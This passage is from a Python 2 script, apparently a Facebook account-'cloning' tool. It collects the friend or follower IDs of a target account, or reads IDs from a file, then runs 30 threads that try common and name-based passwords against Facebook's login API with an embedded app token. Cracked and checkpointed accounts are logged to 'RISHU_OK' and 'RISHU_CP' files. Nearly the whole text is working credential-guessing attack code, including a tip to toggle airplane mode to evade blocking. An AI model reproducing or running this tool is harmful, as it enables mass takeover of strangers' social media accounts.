                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name.lower() + '123456'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('RISHU_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('RISHU_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = name.lower() + '786'
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('RISHU_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('RISHU_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '786786'
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('RISHU_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('RISHU_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '223344'
                                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass8 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                        q = json.loads(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('RISHU_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('RISHU_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\033[1;97m-------------------------------------------------")
    print("\033[1;97m[!] The cloning process has been completed")
    print '\x1b[1;92mTotal \x1b[1;92mOk\x1b[1;97m/\x1b[1;93mCp :\x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cps))
    print '\x1b[1;97mTotal \x1b[1;92mOk :\x1b[1;92m' + str(len(oks))
    print '\x1b[1;97mTotal \x1b[1;93mCp :\x1b[1;93m' + str(len(cps))
    print("\033[1;97m-------------------------------------------------")
    raw_input(' \x1b[1;97mPress enter to back\x1b[0;97m')
    brand_menu()


def brand_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;97m~~~ Login FB id to continue ~~~'
        print('\033[1;97m-------------------------------------------------')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("[\033[1;91m\033[1;47m-----------ENTER YOUR DIGITS PASSWORD----------\033[0m]\033[1;37m")
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Public id cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Followers cloning'
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] File cloning'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back\x1b[1;97m'
    print('\033[1;97m-------------------------------------------------')
    bc_s()


def bc_s():
    id = []
    cps = []
    oks = []
    bcs = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : \033[1;92m')
    if bcs == '1':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-----------ENTER YOUR DIGITS PASSWORD----------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97m For example:234567,223344,334455,445566\x1b[1;97m'
        print('\033[1;97m-------------------------------------------------')
        pass1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        pass2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Password : \x1b[1;32m')
        pass3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Password : \x1b[1;32m')
        pass4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Password : \x1b[1;32m')
        pass5 = raw_input('\x1b[1;97m[\033[1;92m5\033[1;97m] Password : \x1b[1;32m')
        pass6 = raw_input('\x1b[1;97m[\033[1;92m6\033[1;97m] password : \x1b[1;32m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t \033[1;91mInvalid user \x1b[0;97m'
            raw_input('\x1b[1;97m Press enter to try again ')
            brand_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif bcs == '2':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-----------ENTER YOUR DIGITS PASSWORD----------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97m For example:234567,223344,334455,445566\x1b[1;97m'
        print('\033[1;97m-------------------------------------------------')
        pass1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \033[1;92m')
        pass2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Password : \033[1;92m')
        pass3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Password : \033[1;92m')
        pass4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Password : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t\033[1;91m Invalid user \x1b[0;97m'
            raw_input('\x1b[1;97mPress enter to try again ')
            brand_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif bcs == '3':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-----------ENTER YOUR DIGITS PASSWORD----------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97m For example:234567,223344,334455,445566\x1b[1;97m'
        print('\033[1;97m-------------------------------------------------')
        pass1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        pass2 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        pass3 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        pass4 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        pass5 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        pass6 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Password : \x1b[1;32m')
        print('\033[1;97m-------------------------------------------------')
        try:
            idlist = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] File Name : \x1b[0;92m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\033[1;91m[!] File Not Found.'
            raw_input('\x1b[1;97mPress Enter To Back. ')
            brand_crack()

    elif bcs == '0':
        jutt_menu()
    else:
        print '\x1b[1;91m Choose valid option'
        bc_s()
    print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Total ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("      Use flight Airplane Mode Before Use")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('RISHU_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('RISHU_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('RISHU_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('RISHU_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('RISHU_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('RISHU_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('RISHU_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('RISHU_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('RISHU_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('RISHU_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('RISHU_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('RISHU_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\033[1;97m-------------------------------------------------")
    print("\033[1;97m[!] The cloning process has been completed")
    print '\x1b[1;92mTotal \x1b[1;92mOk\x1b[1;97m/\x1b[1;93mCp :\x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cps))
    print '\x1b[1;97mTotal \x1b[1;92mOk :\x1b[1;92m' + str(len(oks))
    print '\x1b[1;97mTotal \x1b[1;93mCp :\x1b[1;93m' + str(len(cps))
    print("\033[1;97m-------------------------------------------------")
    raw_input('\x1b[1;97m Press enter to back\x1b[0;97m')
    brand_menu()


def fast_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t \033[1;97mLogin FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Public id cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Followers cloning'
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] File cloning'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back\x1b[1;97m'
    print('\033[1;97m-------------------------------------------------')
    fc_s()


def fc_s():
    id = []
    cps = []
    oks = []
    f_s = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : \033[1;92m')
    if f_s == '1':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        p1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Name + digit : \033[1;92m')
        p2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Name + digit : \033[1;92m')
        p3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Name + digit : \033[1;92m')
        p4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Name + digit : \033[1;92m')
        pass5 = raw_input('\x1b[1;97m[\033[1;92m5\033[1;97m] Password : \033[1;92m')
        pass6 = raw_input('\x1b[1;97m[\033[1;92m6\033[1;97m] Password : \033[1;92m')
        pass7 = raw_input('\x1b[1;97m[\033[1;92m7\033[1;97m] Password : \033[1;92m')
        pass8 = raw_input('\x1b[1;97m[\033[1;92m8\033[1;97m] Password : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t \033[1;91mInvalid user \x1b[0;97m'
            raw_input(' \x1b[1;97mPress enter to try again \x1b[1;97m')
            fast_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif f_s == '2':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        p1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Name + digit : \033[1;92m')
        p2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Name + digit : \033[1;92m')
        p3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Name + digit : \033[1;92m')
        p4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Name + digit : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] ]Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from: ' + z
        except (KeyError, IOError):
            print '\t \033[1;91mInvalid user \x1b[0;97m'
            raw_input('\x1b[1;97mPress enter to try again \x1b[1;97m')
            fast_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif f_s == '3':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m------------NAME AND DIGITS PASSWORD-----------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        p1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Name + digit : \033[1;92m')
        p2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Name + digit : \033[1;92m')
        p3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Name + digit : \033[1;92m')
        p4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Name + digit : \033[1;92m')
        pass5 = raw_input('\x1b[1;97m[\033[1;92m5\033[1;97m] Password : \033[1;92m')
        pass6 = raw_input('\x1b[1;97m[\033[1;92m6\033[1;97m] Password : \033[1;92m')
        pass7 = raw_input('\x1b[1;97m[\033[1;92m7\033[1;97m] Password : \033[1;92m')
        pass8 = raw_input('\x1b[1;97m[\033[1;92m8\033[1;97m] Password : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        try:
            idlist = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\033[1;92m[!] File Not Found.'
            raw_input('\x1b[1;97mPress Enter To Back. \x1b[1;97m')
            fast_crack()

    elif f_s == '0':
        jutt_menu()
    else:
        print ''
        print '\x1b[1;31mChoose valid option'
        fc_s()
    print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Total ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("      Use flight Airplane Mode Before Use")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower() + p1
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('RISHU_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('RISHU_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('RISHU_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('RISHU_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('RISHU_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('RISHU_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;93m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
